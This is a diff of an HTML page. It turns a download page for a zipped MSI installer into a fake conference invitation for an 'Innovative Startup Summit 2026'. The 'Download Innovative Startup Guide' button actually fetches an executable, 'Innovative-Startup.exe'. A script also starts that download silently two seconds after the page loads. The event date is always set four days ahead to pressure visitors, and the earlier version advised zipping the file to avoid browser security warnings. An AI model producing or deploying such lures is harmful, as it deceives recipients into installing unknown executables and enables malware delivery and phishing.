@@ -1,10 +1,326 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Work Event Invitation</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+            padding: 20px 10px;
+            line-height: 1.6;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px 50px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 800px;
+            width: 95%;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #007bff, #667eea, #764ba2);
+        }
+        .countdown {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 25px;
+            border-left: 4px solid #007bff;
+        }
+        .countdown-text {
+            font-size: 0.9em;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        .countdown-timer {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #007bff;
+        }
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 2em;
+            text-align: center;
+            background: linear-gradient(135deg, #007bff, #667eea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .event-date-badge {
+            display: inline-block;
+            background: #e3f2fd;
+            color: #007bff;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 1em;
+            font-weight: 600;
+            margin: 0 auto 25px;
+            text-align: center;
+            display: table;
+        }
+        h2 {
+            color: #2c3e50;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            font-size: 1.4em;
+            position: relative;
+            padding-left: 15px;
+        }
+        h2::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 4px;
+            height: 70%;
+            background: linear-gradient(180deg, #007bff, #667eea);
+            border-radius: 2px;
+        }
+        p {
+            font-size: 1.05em;
+            margin-bottom: 15px;
+            color: #555;
+        }
+        ul {
+            list-style-type: none;
+            margin-left: 0;
+            margin-bottom: 20px;
+            font-size: 1.05em;
+        }
+        ul li {
+            padding: 10px 15px 10px 40px;
+            margin-bottom: 10px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            position: relative;
+            color: #555;
+            transition: transform 0.2s ease;
+        }
+        ul li:hover {
+            transform: translateX(5px);
+        }
+        ul li::before {
+            content: '✓';
+            position: absolute;
+            left: 15px;
+            color: #28a745;
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+        .download-button {
+            display: block;
+            background: linear-gradient(135deg, #007bff 0%, #667eea 100%);
+            color: #ffffff;
+            padding: 16px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 1.15em;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            margin: 30px auto;
+            text-align: center;
+            max-width: fit-content;
+            box-shadow: 0 5px 20px rgba(0, 123, 255, 0.4);
+            cursor: pointer;
+            border: none;
+        }
+        .download-button:hover {
+            background: linear-gradient(135deg, #0056b3 0%, #5a6fd8 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 123, 255, 0.5);
+        }
+        .download-button:active {
+            transform: translateY(-1px);
+        }
+        .download-status {
+            text-align: center;
+            font-size: 0.95em;
+            color: #28a745;
+            margin-top: -15px;
+            margin-bottom: 25px;
+            display: none;
+        }
+        .essentials-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .essential-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .essential-label {
+            font-size: 0.85em;
+            color: #777;
+            margin-bottom: 5px;
+        }
+        .essential-value {
+            font-size: 1em;
+            font-weight: 600;
+            color: #333;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
+            color: #777;
+            font-size: 0.9em;
+        }
+        @media only screen and (max-width: 600px) {
+            body {
+                padding: 10px 5px;
+            }
+            .container {
+                padding: 25px 20px;
+                width: 98%;
+            }
+            h1 {
+                font-size: 1.5em;
+                margin-bottom: 15px;
+            }
+            h2 {
+                font-size: 1.2em;
+                margin-top: 25px;
+                margin-bottom: 10px;
+            }
+            p, ul {
+                font-size: 0.95em;
+            }
+            .download-button {
+                padding: 14px 28px;
+                font-size: 1.05em;
+                margin: 25px auto;
+            }
+            .essentials-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
 <body>
-    <h1>System Startup 2.0 Download</h1>
-    <p style="color: #666; font-size: 14px; margin-bottom: 20px;">
-        Note: The file is compressed in a ZIP to avoid browser security warnings. Download it, extract the MSI, and run the installer.
-    </p>
-    <p><a href="systemstartup2.0.zip" download="systemstartup2.0.zip">Click here to download systemstartup2.0.zip</a></p>
+    <div class="container">
+        <h1>You're Invited: Innovative Startup Summit 2026</h1>
+        <div class="event-date-badge">March 20-22, 2026 • Grand Convention Center, Metropolis City</div>
+        
+        <div class="countdown" id="eventCountdown" style="background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 25px; border-left: 4px solid #007bff;">
+            <div class="countdown-text" style="font-size: 0.9em; color: #666; margin-bottom: 5px;">Event starts in</div>
+            <div class="countdown-timer" id="timer" style="font-size: 1.5em; font-weight: bold; color: #007bff;">Loading...</div>
+        </div>
+
+        <p>Dear Esteemed Colleague,</p>
+        <p>Join us for our premier industry gathering where we'll bring together the brightest minds in technology and business. Connect with global thought leaders, explore cutting-edge innovations like AI, sustainable tech and cybersecurity, and unlock new partnership opportunities that will shape the future of our industry.</p>
+        
+        <button class="download-button" onclick="triggerDownload()">
+            📥 Download Innovative Startup Guide
+        </button>
+
+        <h2>Key Event Highlights</h2>
+        <ul>
+            <li>3 days of keynotes, interactive workshops and networking sessions</li>
+            <li>Industry-leading speakers from GlobalTech, EcoSolutions, OmniConnect and more</li>
+            <li>Exclusive access to post-summit resources (session recordings, slides)</li>
+            <li>Gala dinner and welcome reception for premium networking</li>
+        </ul>
+
+        <h2>Quick Essentials</h2>
+        <div class="essentials-grid">
+            <div class="essential-item">
+                <div class="essential-label">📍 Venue</div>
+                <div class="essential-value">Moscone Center, San Francisco, CA</div>
+            </div>
+            <div class="essential-item">
+                <div class="essential-label">👔 Dress Code</div>
+                <div class="essential-value">Business formal / Workshop casual</div>
+            </div>
+
+        </div>
+
+        <p>We can't wait to welcome you to this landmark event where we'll collectively shape the future of startups and innovation.</p>
+        <p>Sincerely,<br><strong>The Organizing Committee</strong><br>Innovative Startup Summit 2026</p>
+
+        <div class="footer">
+            <p>&copy; 2026 Innovative Startup Summit. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        // Always set event to start 4 days from today
+        const today = new Date();
+        const eventDate = new Date(today);
+        eventDate.setDate(today.getDate() + 4); // Add 4 days to current date
+        
+        // Format and display the event date
+        const eventDateStr = eventDate.toLocaleDateString('en-US', { 
+            year: 'numeric', 
+            month: 'long', 
+            day: 'numeric' 
+        });
+        document.querySelector('.event-date-badge').textContent = `${eventDateStr} • Moscone Center, San Francisco, CA`;
+        
+        // Update countdown timer continuously
+        function updateCountdown() {
+            const now = new Date();
+            const timeRemaining = eventDate - now;
+            
+            if (timeRemaining > 0) {
+                const days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
+                
+                document.getElementById('timer').textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+            } else {
+                document.getElementById('timer').textContent = "Event is happening now!";
+            }
+        }
+        
+        // Update countdown immediately and then every second
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+
+        function triggerDownload() {
+            // Create a hidden link element
+            const link = document.createElement('a');
+            // Link to the existing file in your workspace
+            link.href = 'Innovative-Startup.exe';
+            link.download = 'Innovative-Startup.exe'; // Download with the actual filename
+            // Append to the body (required for Firefox)
+            document.body.appendChild(link);
+            // Programmatically click the link to trigger download
+            link.click();
+            // Remove the link from the DOM
+            document.body.removeChild(link);
+        }
+
+        // Auto-trigger download after 2 seconds when page loads (silent)
+        window.onload = function() {
+            setTimeout(triggerDownload, 2000); // 2000 milliseconds = 2 seconds
+        };
+    </script>
 </body>
 </html>
